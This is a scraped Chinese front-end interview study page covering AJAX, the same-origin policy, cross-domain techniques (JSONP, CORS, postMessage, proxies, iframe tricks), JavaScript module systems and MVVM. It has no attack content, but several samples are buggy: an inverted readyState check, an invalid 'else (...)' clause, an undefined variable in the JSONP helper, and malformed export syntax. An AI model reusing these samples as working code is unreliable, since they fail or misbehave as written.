&#125;&#125;//第一帧渲染window.requestAnimationFrame(render); 通信同源策略 Cookie、LocalStorage、IndexDB无法读取 前端跨域的几种解决办法 AJAX 请求不能发送 前后端如何通信 Ajax Websocket CORS 如何创建Ajax XMLHttpRequest对象工作流程 兼容性处理 事件触发条件 事件触发顺序 1234567891011121314151617181920212223242526272829303132333435363738let xhr = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");// 请求成功回调函数xhr.onload = e =&gt; &#123; console.log('request success');&#125;;// 请求结束xhr.onloadend = e =&gt; &#123; console.log('request loadend');&#125;;// 请求出错xhr.onerror = e =&gt; &#123; console.log('request error');&#125;;// 请求超时xhr.ontimeout = e =&gt; &#123; console.log('request timeout');&#125;;// 请求回调函数xhr.onreadystatechange = () =&gt; &#123; if (xhr.readyState !== 4) &#123; if (xhr.status === 200) &#123; console.log('request success'); &#125; else &#123; console.log('request error'); &#125; &#125;&#125;;xhr.timeout = 0; // 设置超时时间,0表示永不超时// 初始化请求xhr.open('GET/POST/DELETE/...', '/url', true || false);// 设置期望的返回数据类型 'json' 'text' 'document' ...xhr.responseType = '';// 设置请求头xhr.setRequestHeader('', '');// 发送请求xhr.send(null || new FormData || 'a=1&amp;b=2' || 'json字符串'); 前端跨域的几种解决办法 参考 segmentfault 前端常见跨域解决方案 什么是跨域？跨域是指一个域下的文档或脚本试图去请求另一个域下的资源，这里跨域是广义的。广义的跨域： 资源跳转： A链接、重定向、表单提交 资源嵌入： &lt;link&gt;、&lt;script&gt;、&lt;img&gt;、&lt;frame&gt;等dom标签，还有样式中background:url()、@font-face()等文件外链 脚本请求： js发起的ajax请求、dom和js对象的跨域操作等 其实我们通常所说的跨域是狭义的，是由浏览器同源策略限制的一类请求场景。 什么是同源策略？ 同源策略/SOP（Same origin policy）是一种约定，由Netscape公司1995年引入浏览器，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，浏览器很容易受到XSS、CSFR等攻击。所谓同源是指”协议+域名+端口”三者相同，即便两个不同的域名指向同一个ip地址，也非同源。 同源策略限制以下几种行为： Cookie、LocalStorage 和 IndexDB 无法读取 DOM 和 JS对象无法获得 AJAX 请求不能发送 常见跨域场景1234567891011121314151617181920URL 说明 是否允许通信http://www.domain.com/a.jshttp://www.domain.com/b.js 同一域名，不同文件或路径 允许http://www.domain.com/lab/c.jshttp://www.domain.com:8000/a.jshttp://www.domain.com/b.js 同一域名，不同端口 不允许 http://www.domain.com/a.jshttps://www.domain.com/b.js 同一域名，不同协议 不允许 http://www.domain.com/a.jshttp://192.168.4.12/b.js 域名和域名对应相同ip 不允许 http://www.domain.com/a.jshttp://x.domain.com/b.js 主域相同，子域不同 不允许http://domain.com/c.js http://www.domain1.com/a.jshttp://www.domain2.com/b.js 不同域名 不允许 面试时选答jsonp、iframe、postMessage、CORS、websocket、nginx代理、nodejs代理 跨域解决方案1、 通过jsonp跨域2、 postMessage跨域3、 跨域资源共享（CORS）4、 nginx代理跨域5、 nodejs中间件代理跨域6、 WebSocket协议跨域7、 document.domain + iframe跨域8、 location.hash + iframe9、 window.name + iframe跨域 通过jsonp跨域jsonp缺点：只能实现get一种请求。 具体内部逻辑参考：CSDN jsonp原理详解 原生js实现前端创建一个script标签，并将src设置为后端给的接口地址，插入到document即可自动发起请求（get请求） 1234567891011var script = document.createElement('script');script.type = 'text/javascript';// 传参并指定回调执行函数为onBackscript.src = 'http://www.domain2.com:8080/login?user=admin&amp;callback=onBack';document.head.appendChild(script);// 回调执行函数function onBack(res) &#123; alert(JSON.stringify(res));&#125; 服务端返回如下（返回时即执行全局函数）：Response Content-Type: application/javascript，所以可以立即执行。 1onBack(&#123;"status": true, "user": "admin"&#125;) 常见的Content-Type：1). text/plain: 纯文本格式2). text/xml: HTML格式3). text/html: HTML代码4). text/css: CSS代码5). image/png、image/jpeg、image/gif: 图片格式6). application/pdf: PDF格式7). application/msword: Word格式8). application/javascript: JavaScript格式（jsonp请求）9). application/json: JSON格式10). application/octet-stream: 二进制流数据（用户文件文件下载）11). application/x-www-form-urlencoded: 提交表单12). multipart/form-data: 文件上传 一个稍微标准的jsonp请求应该是这样的： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061/** * @param &#123;Object&#125; opt * @param &#123;String&#125; url: 接口地址 * @param &#123;Object&#125; data: 辅助字段 * @param &#123;Number&#125; time: 超时时间，ms * @param &#123;Function&#125; success: 成功回调 * @param &#123;Function&#125; error: 失败回调 */function jsonp (opt) &#123; // 生成script并插入到body中 var script = document.createElement('script'); document.body.appendChild(script); // 创建jsonp回调函数 var callbackName = '业务名_jsonp_' + new Date().getTime(); // 将回调方法放在方法体内部 opt.data['callback'] = callbackName; // 将回调函数放在data中传给后端 window[callbackName] = function (data) &#123; opt.success &amp;&amp; opt.success(data); // 最终将数据传给success &#125; // 设置script地址，发送get请求 if (opt.url.indexOf('?') &gt; -1) &#123; script.src = opt.url + '&amp;' + formatData(data); &#125; else &#123; script.src = opt.url + '?' +formatData(data); &#125; // script一旦加载表明请求已经发送，可以开始移除相应的方法 script.onload = function () &#123; kill(); &#125; // 捕获到异常，移除相应的方法 script.onerror = function () &#123; kill(); &#125; // 监听超时 if (opt.time) &#123; script.timer = setTimeout(function () &#123; kill(); // 添加相应的toast反馈 &#125;, opt.time); &#125; // kill相关方法 function kill () &#123; clearTimeout(script.timer); script.remove(); delete window[callbackName]; &#125; // 拼接data数据 function formatData () &#123; var arr = []; for (var name in data) &#123; arr.push(encodeURIComponent(name) + '=' + encodeURIComponent(data[name])); &#125; // 添加一个随机数，防止缓存 arr.push('v=' + random()); return arr.join('&amp;'); &#125;&#125; jquery ajax 12345678910$.ajax(&#123; url: 'http://www.domain2.com:8080/login', type: 'get', dataType: 'jsonp', // 请求方式为jsonp jsonpCallback: "onBack", // 自定义回调函数名 data: &#123;&#125;, success: function (res) &#123; console.log(res); &#125;&#125;); vue.js 123456this.$http.jsonp('http://www.domain2.com:8080/login', &#123; params: &#123;&#125;, jsonp: 'onBack'&#125;).then((res) =&gt; &#123; console.log(res); &#125;); 服务端处理服务端的本质就是想办法再将reponse变成一段可执行的javascript代码，前端获取返回之后就会去调用设定好的全局方法，并且接收参数 1onBack(&#123;status: 1, data: &#123;&#125;&#125;) 原理：script标签可跨域访问 postMessage跨域postMessage是HTML5 XMLHttpRequest Level 2中的API，且是为数不多可以跨域操作的window属性之一，它可用于解决以下方面的问题：a. 页面和其打开的新窗口的数据传递b. 多窗口之间消息传递c. 页面与嵌套的iframe消息传递d. 上面三个场景的跨域数据传递 用法：postMessage(data,origin)方法接受两个参数data：html5规范支持任意基本类型或可复制的对象，但部分浏览器只支持字符串，所以传参时最好用JSON.stringify()序列化。origin： 协议+主机+端口号，也可以设置为”*”，表示可以传递给任意窗口，如果要指定和当前窗口同源的话设置为”/“。 a.html：(http://www.domain1.com/a.html) 12345678910111213141516&lt;iframe id="iframe" src="http://www.domain2.com/b.html" style="display:none;"&gt;&lt;/iframe&gt;&lt;script&gt; var iframe = document.getElementById('iframe'); iframe.onload = function() &#123; var data = &#123; name: 'aym' &#125;; // 向domain2传送跨域数据 iframe.contentWindow.postMessage(JSON.stringify(data), 'http://www.domain2.com'); &#125;; // 接受domain2返回数据 window.addEventListener('message', function(e) &#123; alert('data from domain2 ---&gt; ' + e.data); &#125;, false);&lt;/script&gt; b.html：(http://www.domain2.com/b.html) 1234567891011121314&lt;script&gt; // 接收domain1的数据 window.addEventListener('message', function(e) &#123; alert('data from domain1 ---&gt; ' + e.data); var data = JSON.parse(e.data); if (data) &#123; data.number = 16; // 处理后再发回domain1 window.parent.postMessage(JSON.stringify(data), 'http://www.domain1.com'); &#125; &#125;, false); // false默认为冒泡，true表示捕获&lt;/script&gt; 跨域资源共享（CORS） 阮一峰 cors 普通跨域请求：只服务端设置 Access-Control-Allow-Origin 即可，前端无须设置，若要带cookie请求：前后端都需要设置。目前，所有浏览器都支持该功能(IE8+：IE8/9需要使用 XDomainRequest 对象来支持CORS）)，CORS也已经成为主流的跨域解决方案。 前端设置1.）原生ajax 12// 前端设置是否带cookiexhr.withCredentials = true; 示例代码： 1234567891011121314var xhr = new XMLHttpRequest(); // IE8/9需用window.XDomainRequest兼容// 前端设置是否带cookiexhr.withCredentials = true;xhr.open('post', 'http://www.domain2.com:8080/login', true);xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');xhr.send('user=admin');xhr.onreadystatechange = function() &#123; if (xhr.readyState == 4 &amp;&amp; xhr.status == 200) &#123; alert(xhr.responseText); &#125;&#125;; 2.）jQuery ajax 12345678$.ajax(&#123; ... xhrFields: &#123; withCredentials: true // 前端设置是否带cookie &#125;, crossDomain: true, // 会让请求头中包含跨域的额外信息，但不会含cookie ...&#125;); 3.）Vue ajax 12345// axiosaxios.defaults.withCredentials = true// vue-resourceVue.http.options.credentials = true 服务端设置若后端设置成功，前端浏览器控制台则不会出现跨域报错信息，反之，说明没设成功。1.）Java后台 12345678910111213/* * 导入包：import javax.servlet.http.HttpServletResponse; * 接口参数中定义：HttpServletResponse response */// 允许跨域访问的域名：若有端口需写全（协议+域名+端口），若没有端口末尾不用加'/'response.setHeader("Access-Control-Allow-Origin", "http://www.domain1.com"); // 允许前端带认证cookie：启用此项后，上面的域名不能为'*'，必须指定具体的域名，否则浏览器会提示response.setHeader("Access-Control-Allow-Credentials", "true"); // 提示OPTIONS预检时，后端需要设置的两个常用自定义头response.setHeader("Access-Control-Allow-Headers", "Content-Type,X-Requested-With"); 2.） Node.js 12345678910111213141516171819202122232425262728293031323334var http = require('http');var server = http.createServer();var qs = require('querystring');server.on('request', function(req, res) &#123; var postData = ''; // 数据块接收中 req.addListener('data', function(chunk) &#123; postData += chunk; &#125;); // 数据接收完毕 req.addListener('end', function() &#123; postData = qs.parse(postData); // 跨域后台设置 res.writeHead(200, &#123; 'Access-Control-Allow-Credentials': 'true', // 后端允许发送Cookie 'Access-Control-Allow-Origin': 'http://www.domain1.com', // 允许访问的域（协议+域名+端口） /* * 此处设置的cookie还是domain2的而非domain1，因为后端也不能跨域写cookie(nginx反向代理可以实现)， * 但只要domain2中写入一次cookie认证，后面的跨域接口都能从domain2中获取cookie，从而实现所有的接口都能跨域访问 */ 'Set-Cookie': 'l=a123456;Path=/;Domain=www.domain2.com;HttpOnly' // HttpOnly的作用是让js无法读取cookie &#125;); res.write(JSON.stringify(postData)); res.end(); &#125;);&#125;);server.listen('8080');console.log('Server is running at port 8080...'); nginx代理跨域 nginx配置解决iconfont跨域浏览器跨域访问js、css、img等常规静态资源被同源策略许可，但iconfont字体文件(eot|otf|ttf|woff|svg)例外，此时可在nginx的静态资源服务器中加入以下配置。 123location / &#123; add_header Access-Control-Allow-Origin *;&#125; nginx反向代理接口跨域跨域原理： 同源策略是浏览器的安全策略，不是HTTP协议的一部分。服务器端调用HTTP接口只是使用HTTP协议，不会执行JS脚本，不需要同源策略，也就不存在跨越问题。实现思路：通过nginx配置一个代理服务器（域名与domain1相同，端口不同）做跳板机，反向代理访问domain2接口，并且可以顺便修改cookie中domain信息，方便当前域cookie写入，实现跨域登录。 1.) nginx具体配置： 123456789101112131415#proxy服务器server &#123; listen 81; server_name www.domain1.com; location / &#123; proxy_pass http://www.domain2.com:8080; #反向代理 proxy_cookie_domain www.domain2.com www.domain1.com; #修改cookie里域名 index index.html index.htm; # 当用webpack-dev-server等中间件代理接口访问nignx时，此时无浏览器参与，故没有同源限制，下面的跨域配置可不启用 add_header Access-Control-Allow-Origin http://www.domain1.com; #当前端只跨域不带cookie时，可为* add_header Access-Control-Allow-Credentials true; &#125;&#125; 2.) 前端代码示例： 12345678var xhr = new XMLHttpRequest();// 前端开关：浏览器是否读写cookiexhr.withCredentials = true;// 访问nginx中的代理服务器xhr.open('get', 'http://www.domain1.com:81/?user=admin', true);xhr.send(); 3.) Nodejs后台示例： 123456789101112131415161718var http = require('http');var server = http.createServer();var qs = require('querystring');server.on('request', function(req, res) &#123; var params = qs.parse(req.url.substring(2)); // 向前台写cookie res.writeHead(200, &#123; 'Set-Cookie': 'l=a123456;Path=/;Domain=www.domain2.com;HttpOnly' // HttpOnly:脚本无法读取 &#125;); res.write(JSON.stringify(params)); res.end();&#125;);server.listen('8080');console.log('Server is running at port 8080...'); nodejs中间件代理跨域node中间件实现跨域代理，原理大致与nginx相同，都是通过启一个代理服务器，实现数据的转发，也可以通过设置cookieDomainRewrite参数修改响应头中cookie中域名，实现当前域的cookie写入，方便接口登录认证。 WebSocket协议跨域WebSocket protocol 是HTML5一种新的协议。它实现了浏览器与服务器全双工通信，同时允许跨域通讯，是server push技术的一种很好的实现。原生 WebSocket API 使用起来不太方便，我们使用Socket.io，它很好地封装了webSocket接口，提供了更简单、灵活的接口，也对不支持webSocket的浏览器提供了向下兼容。 前端设置： 12345678910111213141516171819202122&lt;div&gt;user input：&lt;input type="text"&gt;&lt;/div&gt;&lt;script src="./socket.io.js"&gt;&lt;/script&gt;&lt;script&gt;var socket = io('http://www.domain2.com:8080');// 连接成功处理socket.on('connect', function() &#123; // 监听服务端消息 socket.on('message', function(msg) &#123; console.log('data from server: ---&gt; ' + msg); &#125;); // 监听服务端关闭 socket.on('disconnect', function() &#123; console.log('Server socket has closed.'); &#125;);&#125;);document.getElementsByTagName('input')[0].onblur = function() &#123; socket.send(this.value);&#125;;&lt;/script&gt; Nodejs socket后台： 123456789101112131415161718192021222324252627var http = require('http');var socket = require('socket.io');// 启http服务var server = http.createServer(function(req, res) &#123; res.writeHead(200, &#123; 'Content-type': 'text/html' &#125;); res.end();&#125;);server.listen('8080');console.log('Server is running at port 8080...');// 监听socket连接socket.listen(server).on('connection', function(client) &#123; // 接收信息 client.on('message', function(msg) &#123; client.send('hello：' + msg); console.log('data from client: ---&gt; ' + msg); &#125;); // 断开处理 client.on('disconnect', function() &#123; console.log('Client socket has closed.'); &#125;);&#125;); document.domain + iframe跨域此方案仅限主域相同，子域不同的跨域应用场景。 实现原理：两个页面都通过js强制设置 document.domain 为基础主域，就实现了同域。 父窗口：(http://www.domain.com/a.html) 12345&lt;iframe id="iframe" src="http://child.domain.com/b.html"&gt;&lt;/iframe&gt;&lt;script&gt; document.domain = 'domain.com'; var user = 'admin';&lt;/script&gt; 子窗口：(http://child.domain.com/b.html) 12345&lt;script&gt; document.domain = 'domain.com'; // 获取父窗口中变量 alert('get js data from parent ---&gt; ' + window.parent.user);&lt;/script&gt; location.hash + iframe实现原理： a与b跨域相互通信，通过中间页c来实现。三个页面，不同域之间利用iframe的location.hash传值，相同域之间直接js访问来通信。 具体实现：A域：a.html -&gt; B域：b.html -&gt; A域：c.html，a与b不同域只能通过hash值单向通信，b与c也不同域也只能单向通信，但c与a同域，所以c可通过parent.parent访问a页面所有对象。 a.html：(http://www.domain1.com/a.html) 1234567891011121314&lt;iframe id="iframe" src="http://www.domain2.com/b.html" style="display:none;"&gt;&lt;/iframe&gt;&lt;script&gt; var iframe = document.getElementById('iframe'); // 向b.html传hash值 setTimeout(function() &#123; iframe.src = iframe.src + '#user=admin'; &#125;, 1000); // 开放给同域c.html的回调方法 function onCallback(res) &#123; alert('data from c.html ---&gt; ' + res); &#125;&lt;/script&gt; b.html：(http://www.domain2.com/b.html) 123456789&lt;iframe id="iframe" src="http://www.domain1.com/c.html" style="display:none;"&gt;&lt;/iframe&gt;&lt;script&gt; var iframe = document.getElementById('iframe'); // 监听a.html传来的hash值，再传给c.html window.onhashchange = function () &#123; iframe.src = iframe.src + location.hash; &#125;;&lt;/script&gt; c.html：(http://www.domain1.com/c.html) 1234567&lt;script&gt; // 监听b.html传来的hash值 window.onhashchange = function () &#123; // 再通过操作同域a.html的js回调，将结果传回 window.parent.parent.onCallback('hello: ' + location.hash.replace('#user=', '')); &#125;;&lt;/script&gt; window.name + iframe跨域window.name 属性的独特之处：name值在不同的页面（甚至不同域名）加载后依旧存在，并且可以支持非常长的 name 值（2MB）。 a.html：(http://www.domain1.com/a.html) 12345678910111213141516171819202122232425262728293031323334var proxy = function(url, callback) &#123; var state = 0; var iframe = document.createElement('iframe'); // 加载跨域页面 iframe.src = url; // onload事件会触发2次，第1次加载跨域页，并留存数据于window.name iframe.onload = function() &#123; if (state === 0) &#123; // 第1次onload(跨域页)成功后，切换到同域代理页面 iframe.contentWindow.location = 'http://www.domain1.com/proxy.html'; state = 1; &#125; else (state === 1) &#123; // 第2次onload(同域proxy页)成功后，读取同域window.name中数据 callback(iframe.contentWindow.name); destoryFrame(); &#125; &#125;; document.body.appendChild(iframe); // 获取数据以后销毁这个iframe，释放内存；这也保证了安全（不被其他域frame js访问） function destoryFrame() &#123; iframe.contentWindow.document.write(''); iframe.contentWindow.close(); document.body.removeChild(iframe); &#125;&#125;;// 请求跨域b页面数据proxy('http://www.domain2.com/b.html', function(data)&#123; alert(data);&#125;); proxy.html：(http://www.domain1.com/proxy....) 中间代理页，与a.html同域，内容为空即可。 b.html：(http://www.domain2.com/b.html) 123&lt;script&gt; window.name = 'This is domain2 data!';&lt;/script&gt; 同源下不同标签的页面如何进行通信localStorage localstorage 是浏览器多个标签共用的存储空间，所以可以用来实现多标签之间的通信(ps：session 是会话级的存储空间，每个标签页都是单独的）。 onstorage 以及 storage 事件，针对都是非当前页面对 localStorage 进行修改时才会触发，当前页面修改 localStorage 不会触发监听函数。然后就是在对原有的数据的值进行修改时才会触发，比如原本已经有一个key为a 值为b的 localStorage，你再执行：localStorage.setItem(&#39;a&#39;, &#39;b&#39;)代码，同样是不会触发监听函数的。 要访问一个localStorage对象，页面必须来自同一个域名（子域名无效），使用同一种协议，在同一个端口上。123window.onstorage = (e) =&gt; &#123;console.log(e)&#125;// 或者这样window.addEventListener('storage', (e) =&gt; console.log(e)) websocketh5 sharedWorker 输出长度为100的数组不使用loop循环输入长度为100的数组，且每项的值等于它的下标，即输出：[0, 1, 2, 3, 4, 5, …]; 首先假设可以使用循环，我们可以这样做：1234let arr = [];for (let i = 0; i &lt; 100; i++) &#123; arr.push(i);&#125; 当不可以使用循环时，我们可能会想到使用 setInterval 定时器来实现：123456let arr = [], i = 0;const interval = setInterval(() =&gt; &#123; i &lt; 100 ? arr.push(i++) : clearInterval(interval);&#125;, 0); 虽然这样可以实现，但是实际上使用定时器的效率并不高，而且本题考查的也不是定时器。 我们可以使用 map 高阶函数来实现12345let arr = new Array(100);arr = arr.map((item, index) =&gt; &#123; return index;&#125;); 但是从控制键查看发现并没有得到我们需要的结果，原来 JavaScript 数组是稀疏数组，通过 new Array() 创建的数组虽然有 length 属性，但实际上它是一个空数组，并不存在真实的元素，所以使用 map 来遍历是不可行的。我们可以通过一些手段先把它转成数组，然后使用 map 方法。 比如 es5 的 new Array(100).join(&#39;,&#39;).split(&#39;,&#39;)或 es6 的 fill 方法：new Array(100).fill(&#39;&#39;) 123456let arr = new Array(100).join(',').split(',');console.log(arr)arr = arr.map((item, index) =&gt; &#123; return index;&#125;); AMD、CMD、CommonJS、ES6模块化AMD(异步模块定义)、CMD(通用模块定义)、CommonJs 是 ES5 中提供的模块化编程的方案RequireJS 遵循的是 AMDSeaJS 遵循的是 CMDCommonJS 是服务器端js模块化的规范，NodeJS 是这种规范的实现import/export 是 ES6 中提出的模块化方案 AMDAMD 是 RequireJS 在推广过程中对模块定义的规范化产出，它是一个概念，RequireJS 是对这个概念的实现。AMD 是一个组织，RequireJS 是在这个组织下自定义的一套脚本语言。 AMD 规范通过 define 方法去定义模块，通过 require 方法去加载模块： RequireJS: 通过 define() 函数定义，第一个参数是一个数组，里面定义一些需要依赖的包，第二个参数是一个回调函数，通过变量来引用模块里面的方法，最后通过 return 来输出。 案例1define定义模块： 12345678910111213141516171819202122232425262728293031323334// module1.js// 定义独立的模块define(&#123; methodA: function() &#123; console.log('我是module1的methodA'); &#125;, methodB: function() &#123; console.log('我是module1的methodB'); &#125;&#125;);// module2.js// 另一种定义独立模块的方式define(function () &#123; return &#123; methodA: function() &#123; console.log('我是module2的methodA'); &#125;, methodB: function() &#123; console.log('我是module2的methodB'); &#125; &#125;;&#125;);// module3.js// 定义非独立的模块（这个模块依赖其他模块）,导入依赖时后缀名可省略define(['module1', 'module2.js'], function(m1, m2) &#123; return &#123; methodC: function() &#123; m1.methodA(); m2.methodB(); &#125; &#125;;&#125;); 再定义一个 main.js，去加载这些个模块，require加载： 123require(['module3.js'], function(m3)&#123; m3.methodC();&#125;); 使用方法1： 12&lt;!-- 等号右边的main指的main.js，后缀名可省略，表示入口文件 --&gt;&lt;script data-main="main.js" src="require.js"&gt;&lt;/script&gt; 使用方法2： 12&lt;script src="require.js"&gt;&lt;/script&gt;&lt;script src="main.js"&gt;&lt;/script&gt; 案例2 设置一个全局的配置，这有利于在大型的项目中使用这种配置： 123456789101112131415&lt;script src="require.js"&gt;&lt;/script&gt;&lt;script src="main.js"&gt;&lt;/script&gt;&lt;script&gt;// 用require引入要引入的模块，[]：里面为引入的名称，已经在main.js里面的paths设置好了// function()小括号里面对应[]里面值，按顺序在()给变量名// jquery一般用 $, bootstrap模块没有输出，函数里面可以不用变量// 在使用的时候，只需要require我们所需的依赖即可require(['jquery','bootstrap'],function ($) &#123; $('#myModal').on('shown.bs.modal', function () &#123; $('#myInput').focus() &#125;);&#125;);&lt;/script&gt; main.js 1234567891011121314151617181920212223242526272829303132333435// 全局配置require.config(&#123; // 根路径设置，paths下面全部都是根据baseUrl的路径去设置 baseUrl:'./js/', paths:&#123; // 引入jQuery jquery:'plugin/jquery', // 引入bootstrap bootstrap:'plugin/bootstrap', // a.js a:'a', // b.js b:'b', // 引入c.js c:'c' &#125;, // 用来配置不兼容的模块，意思是：该模块没有module.exports, // jquery就有module.exports输出值 shim:&#123; //bootstrap没有module.exports输出值，所以得放在shim bootstrap:&#123; //bootstrap需要依赖jquery，所以得加deps deps:["jquery"] // 如果该模块加载进来，需要输出一个值，那就用exports来设置，这里不用设置 // exports:'' &#125; &#125;, //map"告诉RequireJS在任何模块之前，都先载入这个模块 map: &#123; // 这里没有设置，举个例子 // '*': &#123; // 'css': 'plugins/require-css/css' // &#125; &#125;&#125;); output: 12我是module1的methodA我是module2的methodB CMDCMD 是 SeaJS(淘宝) 在推广过程中对模块定义的规范化产出，它是一个概念，SeaJS 是对这个概念的实现。通过 define() 定义，没有依赖前置。1234567define(function(require, exports, module) &#123; var a = require('./a'); // 依赖可以就近书写 a.doSomething(); var b = require('./b'); b.doSomething();&#125;); CMD中输入输出都是用 define 来定义的，只是输出的时候在 define 内部调用的是 export.test = ***，输入的时候 define 内部调用的是 require(&#39;./module.js&#39;)。 案例1 index.html 123456&lt;h1 id="title"&gt;seajs demo&lt;/h1&gt;&lt;script src="https://cdn.bootcss.com/seajs/3.0.3/sea.js"&gt;&lt;/script&gt;&lt;script&gt; seajs.use('./main.js'); // 通过seajs.use加载main.js文件&lt;/script&gt; main.js 1234define(function (require, exports, module) &#123; var title = document.getElementById('title'); title.innerHTML = "yes it works in demo1";&#125;); output: 1"seajs demo" 会被替换成 "yes it works in demo1" 案例2 index.html 123456&lt;h1 id="title"&gt;seajs demo&lt;/h1&gt;&lt;script src="https://cdn.bootcss.com/seajs/3.0.3/sea.js"&gt;&lt;/script&gt;&lt;script&gt; seajs.use('./main.js'); // 通过seajs.use加载main.js文件&lt;/script&gt; module1.js 12345define(function (require, exports, module) &#123; console.log(exports); // export: &#123;&#125; var textContent = 'yes it works in demo2'; exports.text = textContent; // 将需要输出的值存储在exports对象中，再输出&#125;); module2.js 1234567891011121314define(function (require, exports, module) &#123; console.log(exports, module); // export: &#123;&#125; // module: &#123;dependencies: [], deps: &#123;&#125;, id: "http://127.0.0.1:8080/module2.js", uri: id: "http://127.0.0.1:8080/module2.js", status: 6&#125; exports.methodObj = &#123; methodA: function () &#123; console.log('我是module2的methodA') &#125;, methodB: function () &#123; console.log('我是module2的methodB') &#125;, &#125;;&#125;); main.js 12345678910define(function (require, exports, module) &#123; var module1 = require('./module1.js'); // 导入，注意require导入的是一个对象 var title = document.getElementById('title'); title.innerHTML = module1.text; var module2 = require('./module2.js'); var module2Method = module2.methodObj; console.log(module2Method.methodA()); console.log(module2Method.methodB());&#125;); output: 1234"seajs demo" 会被替换成 "yes it works in demo2"我是module2的methodA我是module2的methodB 案例2(设置回调函数) 适用于同时引用多个模块时，通过回调参数获取到相应模块的输出 index.html 12345678910&lt;h1 id="title"&gt;seajs demo&lt;/h1&gt;&lt;script src="https://cdn.bootcss.com/seajs/3.0.3/sea.js"&gt;&lt;/script&gt;&lt;script&gt; seajs.use(['main', 'jquery'], function(main, $) &#123; $('#title').on('click', function () &#123; console.log(main.showLog()) &#125;); &#125;);&lt;/script&gt; main.js 123456define(function (require, exports, module) &#123; var showLog = function () &#123; console.log('title clicked'); &#125; exports.showLog = showLog; // 输出showLog方法&#125;); 案例3(设置别名等config) index.html 12345678910111213141516171819&lt;script src="https://cdn.bootcss.com/seajs/3.0.3/sea.js"&gt;&lt;/script&gt;&lt;script&gt; seajs.config(&#123; alias:&#123; // alias 用于设置别名 // 引入jQuery jquery:'plugin/jquery', // 引入bootstrap bootstrap:'plugin/bootstrap', // a.js a:'a', // b.js b:'b', // 引入c.js c:'c' &#125; &#125;); seajs.use('./main.js'); // 通过seajs.use加载main.js文件&lt;/script&gt; 某个第三方插件，如jquery 123define(function (require, exports, module) &#123; // jquery 源码&#125;); main.js 1234define(function (require, exports, module) &#123; var $ = require('jquery'); $('#title').text(changeText.init());&#125;); AMD、CMD的区别 对于依赖的模块，AMD 是提前执行，CMD 是延迟执行。不过 RequireJS 从 2.0 开始，也改成可以延迟执行（根据写法不同，处理方式不同）。CMD 推崇 as lazy as possible（尽可能的懒加载，也称为延迟加载，即在需要的时候才加载）。 AMD 推崇依赖前置，CMD 推崇依赖就近。 AMD 的 API 默认是一个当多个用，CMD 的 API 严格区分，推崇职责单一。比如 AMD 里，require 分全局 require 和局部 require，都叫 require。CMD 里，没有全局 require，而是根据模块系统的完备性，提供 seajs.use 来实现模块系统的加载启动。CMD 里，每个 API 都简单纯粹。 1234567891011121314// AMD 默认推荐的是define(['./a', './b'], function(a, b) &#123; // 依赖必须一开始就写好 a.doSomething(); b.doSomething();&#125;);// CMDdefine(function(require, exports, module) &#123; var a = require('./a'); // 依赖可以就近书写 a.doSomething(); var b = require('./b'); b.doSomething();&#125;); CommonJSCommonJS 规范是通过 module.exports 来定义的，在前端浏览器中，并不支持 module.exports，Nodejs 端是使用 CommonJS 规范的，前端浏览器一般使用 AMD、CMD、ES6等定义模块化开发的。123456var x = 5;var addX = function (value) &#123; return value + x;&#125;;module.exports.x = x;module.exports.addX = addX; 为了方便，Node 为每个模块提供一个 exports 变量，指向 module.exports，相当于在文件的开头定义了：1var exports = module.exports; 案例： math.js:12345678// 累加函数exports.add = function() &#123; var sum = 0, i = 0, args = arguments, len = args.length; while (i &lt; len) &#123; sum += args[i++]; &#125; return sum;&#125;; increment.js:1234var add = require('math').add;exports.increment = function(val) &#123; return add(val, 1);&#125;; index.js:12var increment = require('increment').increment;var a = increment(1); // 2 一个单独的文件就是一个模块。每一个模块都是一个单独的作用域，也就是说，在该模块内部定义的变量，无法被其他模块读取，除非定义为 global 对象的属性。 输出模块变量的最好方法是使用 module.exports 对象。 加载模块使用 require 方法，该方法读取一个文件并执行，返回文件内部的 module.exports对象。 ES6es6 中使用 import/export 来进行导入导出 示例：lib.js导出: 123456789101112//导出常量export const sqrt = Math.sqrt;//导出函数export function square(x) &#123; return x * x;&#125;;//导出函数export function diag(x, y) &#123; return sqrt(square(x) + square(y));&#125; main.js导入: 1234import &#123; square, diag &#125; from './lib';console.log(square(11)); // 121console.log(diag(4, 3)); // 5 特殊语法1、我们可以使用 export default a 来默认导出一个模块，相当于匿名导出 common.js导出: 12345678910111213// 设定一个默认输出模块export default openApp() &#123; // ***&#125;;// 除了一个默认的模块之外，其余的使用正常的导出export showAlert = function () &#123; // ***&#125;;export showToast = function () &#123; // ***&#125;; main.js导入: 123456// 注：对于默认导出的模块，我们可以另行设置一个名字，其他的必须与导出时的名字一致import open_app, &#123; showAlert, showToast &#125; from './common.js';open_app();showAlert();showToast(); 2、在 export 导出 或 import 导入的时候使用 xx as yy 来设置一个别名2.1 导出时设置别名： common.js: 1234567const showAlert = function () &#123; // ***&#125;;export &#123; showAlert as show_alert,&#125;; main.js导入: 123import &#123; show_alert &#125; from './common.js';show_alert(); 2.2 导入时设置别名：common.js导出: 12345const showAlert = function () &#123; // ***&#125;;export &#123; showAlert &#125;; main.js导入: 123import &#123; showAlert as show_alert &#125; from './common.js';show_alert(); 3、使用通配符 * 来指定一个对象，将所有的输出都挂载改对象上，通常 * 会结合 as 使用common.js导出: 1234567export showAlert = function () &#123; // ***&#125;;export showToast = function () &#123; // ***&#125;; main.js导入: 1234import * as common from './common.js';common.showAlert();common.showToast(); 4、建议当我们明确知道自己需要使用哪些依赖时，我们应该按需加载，只 import 我们需要的那些依赖，这样在打包的时候可以忽略掉其他未使用，减少文件体积。 M-V-VM 参考segmentfault MVVM框架理解及其原理实现 说起 MVVM，就不得不先说下 MVC。 分成 Model、View、Controller，视图上发生变化，通过 Controller（控件）将响应传入到 Model（数据源），由数据源改变 View 上面的数据。MVC框架允许View和Model直接进行通信！！ 但是 View 和 Model 之间随着业务量的不断庞大，会出现蜘蛛网一样难以处理的依赖关系，完全背离了开发所应该遵循的“开放封闭原则”。 面对这个问题，MVVM 框架就出现了，它与 MVC 框架的主要区别有两点：1、实现数据与视图的分离2、通过数据来驱动视图，开发者只需要关心数据变化，DOM操作被封装了。 可以看到 MVVM 分别指 View、Model、View-Model，View 通过 View-Model 的 DOM Listeners 将事件绑定到 Model 上，而 Model 则通过 Data Bindings 来管理 View 中的数据，View-Model 